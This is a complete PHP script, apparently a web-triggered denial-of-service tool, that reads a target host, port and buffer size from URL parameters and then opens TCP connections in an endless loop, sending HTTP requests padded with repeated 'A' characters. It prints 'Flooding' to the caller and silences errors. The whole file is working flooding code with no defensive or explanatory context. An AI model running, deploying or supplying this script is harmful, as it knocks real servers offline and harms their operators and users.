<?php
error_reporting(0);

$host=$_GET['host'];
$port=$_GET['port'];
$buffer=$_GET['buff'];

$packet="";
for($x=0;$x<$buffer;$x++) {
    $packet.="A";
}

$headers="GET /?buff=$packet HTTP/1.1\r\n";
$headers.="Host: $host\r\n";
$headers.="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\r\n";
$headers.="Content-Type: text/plain;charset=UTF-8\r\n";
$headers.="Accept: text/html,application/xhtml+xml,application/xml\r\n";
$headers.="Accept-Language: en-US\r\n";
$headers.="Accept-Encoding: gzip, deflate\r\n";
$headers.="Connection: close\r\n\r\n";

if(!empty($host) && !empty($port) && !empty($buffer)) {
    echo "Flooding $host On Port $port";
    while(true) {
        $s=socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        socket_connect($s, $host, $port);
        if(!socket_write($s, $headers, strlen($headers))) {
            exit();
        }
        socket_close($s);
    }
}
